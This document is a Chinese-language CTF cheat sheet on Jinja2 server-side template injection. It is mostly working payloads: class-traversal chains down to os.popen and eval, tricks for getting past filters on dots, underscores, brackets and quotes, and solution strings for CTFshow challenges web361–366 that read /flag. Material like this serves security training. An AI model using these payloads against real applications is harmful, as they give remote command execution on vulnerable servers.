# ssti

---

[TOC]

## 利用链（总结ing）

### 一个渐进的过程

```python
举一个例子
1. 找到注入点
2. 尝试是否是ssti漏洞 --- {{7*7}}

3.{"".__class__.__base__.__subclasses__()}

4.在众多类中中找我们可以利用的类，可以浏览器高亮找，可以用Python脚本去寻找,找到下标号

5.利用我们这个利用类，去利用他的一些函数之类东西，去带出flag
{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("ls").read()}}
```



### os._wrap_close

```python
"".__class__.__bases__[0].__subclasses__()[..].__init__.__globals__['popen']('whoami').read()
"".__class__.__bases__[0].__subclasses__()[..].__init__.__globals__.popen('whoami').read()
```

### os类

```python
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

### 使用__import__下的os（python2不行）

可以使用 __import__ 的 os

```
"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
```



### \__builtins__

下有eval，__import__等的函数，可以利用此来执行命令

```python
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```



### 直接方法

```python
{{lipsum.__globals__['os'].popen('tac ../flag').read()}}
#request对象的方法绕过

{{cycler.__init__.__globals__.os.popen('ls').read()}}
```



## 绕过方法（总结ing）

### 基类

```python
__mro__[-1] 
__base__
__bases__[0]
```

`.` 被ban

```python
1、用[]代替.
{{"".__class__}}={{""['__class']}}
2、用attr()过滤器绕过，举个例子
{{"".__class__}}={{""|attr('__class__')}}
```

`_` 被ban

```python
1、通过list获取字符列表，然后用pop来获取_，举个例子
{% set a=(()|select|string|list).pop(24)%}{%print(a)%}
2、可以通过十六进制编码的方式进行绕过，举个例子
{{()["\x5f\x5fclass\x5f\x5f"]}} ={{().__class__}}
3.利用过滤器
filters中的attr来过滤下划
?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
```

`[]`被ban

```
__getitem__()
```



### 单双引号被ban

采用传递参数的方法：

- `request.args.参数名`
- `request.cookies.参数名`
- `request.values.参数名`

---

## CTFSHOW ssti

### web361

```python
{{ "".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}
```



### web362

> 过滤了数字32

```python
//利用运算
{{ "".__class__.__base__.__subclasses__()[140-8].__init__.__globals__['popen']("cat /flag").read()}}
```

```python
{{lipsum.__globals__.__getitem__("os").popen("cat /flag").read()}}
```

```python
{{ "".__class__.__base__.__subclasses__()[94]["get_data"](0,"/flag")}}
```



### web363

> 过滤了单双引号

这里采用传get参数的方法，通过传参数绕过单双引号

```python
?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.bx).read()}}&popen=popen&bx=cat /flag
```



### web364

> 单双引号，args这个也ban了

```python
?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.b]([request.cookies.x).read()}}

#cookie中添加
b=popen&x=cat /flag
```



### web365

> 单双引号，args ,   [] 被ban

```python
?name={{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()}}&a=popen&b=cat /flag
```



### web366

> 单双引号，和下划线被ban

```python
?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
```

利用filters中的attr来过滤下划
